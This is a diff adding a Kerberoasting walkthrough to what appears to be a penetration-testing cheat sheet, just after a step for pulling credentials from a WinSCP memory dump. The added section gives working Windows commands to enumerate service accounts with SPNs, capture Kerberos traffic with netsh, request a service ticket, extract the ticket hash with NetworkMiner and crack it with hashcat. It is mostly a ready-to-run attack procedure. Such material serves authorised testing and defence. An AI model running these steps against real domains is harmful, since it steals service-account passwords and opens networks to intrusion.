@@ -1361,3 +1361,66 @@ Search for credentials in winscp.dmp on the attacking host.<br />
 
 Example output:<br />
 `user192.168.20.33Lam3Password!`
+
+## >> Targeted Kerberoasting using LOLbin programs
+
+Assumes you have (compromised) a Windows computer that can access the domain with user privileges and have local administrator privileges to run `netsh`.
+
+**List all user accounts with SPNs under a specific OU**
+
+`dsquery * "OU=Service Accounts,DC=my,DC=lab" -filter "(&(objectcategory=user) (servicePrincipalName=*))" -attr distinguishedName servicePrincipalName -limit 0 > C:\temp\spn_accounts.txt`
+
+Look through the file `C:\temp\spn_accounts.txt` for an interesting account and note the `distinguishedName` and `servicePrincipalName`.<br />
+(e.g.)<br />
+```
+distinguishedName:    CN=Admin Service,OU=Services Accounts,DC=my,DC=lab
+servicePrincipalName: http/automation;http/automation.my.lab;
+```
+**Get the IP addresses of the Domain Controllers**
+
+`nslookup -type=all _ldap._tcp.dc._msdcs.my.lab`
+
+(e.g.)<br />
+```
+dc01.my.lab    internet address = 10.1.2.10
+dc02.my.lab    internet address = 10.1.2.11
+```
+
+**Clear the Kerberos tickets on the host**
+
+`klist purge`
+
+**Start a packet capture using netsh from en elevated command prompt**
+
+(filter the packet trace to just the DCs identified earlier)<br />
+`netsh trace start scenario=NetConnection capture=yes persistent=no maxsize=512 filemode=circular overwrite=yes report=no correlation=no traceFile=c:\temp\capture.etl IPv4.Address=(10.1.2.10,10.1.2.11) Ethernet.Type=IPv4`<br />
+wait for the command prompt to return.
+
+**Get a kerberos TGS using the SPN***
+
+`klist get http/automation.my.lab`
+
+**Stop the packet capture from the elevated command prompt**
+
+`netsh trace stop`<br />
+wait for the command prompt to return.
+
+**The remaining steps are performed off-host on an attacking Windows system**
+
+(1) Copy `c:\temp\capture.etl` to the attack system.<br />
+(2) Ensure the attack system has the following tools installed.<br />
+    [etl2pcapng](https://github.com/microsoft/etl2pcapng)<br />
+    [NetworkMiner >= 2.6](https://www.netresec.com)<br />
+    [WireShark](https://www.wireshark.org/)<br />
+(3) Convert the netsh file to pcapng format.<br />
+    `etl2pcapng.exe capture.etl capture.pcapng`<br />
+(4) Open the `capture.pcapng` file in WireShark and save as a classic pcap file `capture.pcap`.  Discard comments when saving if prompted to do so.<br />
+(5) Open `capture.pcap` in NetworkMiner.  Under the "Credentials" tab right-click on the krb5tgs entry and select "Copy Password".  Save the text from the clipboard into a file called "tgs.txt".<br />
+(6) The encryption type at the beginning of the string pasted into the "tgs.txt" file will tell you if the ticket was encrypted with RC4 or AES.<br />
+(e.g)<br />
+```
+$krb5tgs$23$ = RC4     = hashcat mode 13100
+$krb5tgs$17$ = AES-128 = hashcat mode 19600
+$krb5tgs$18$ = AES-256 = hashcat mode 19700
+```
+(7) Feed the contents of "tgs.txt" into hashcat to attempt to crack to the sevice account's plaintext password.
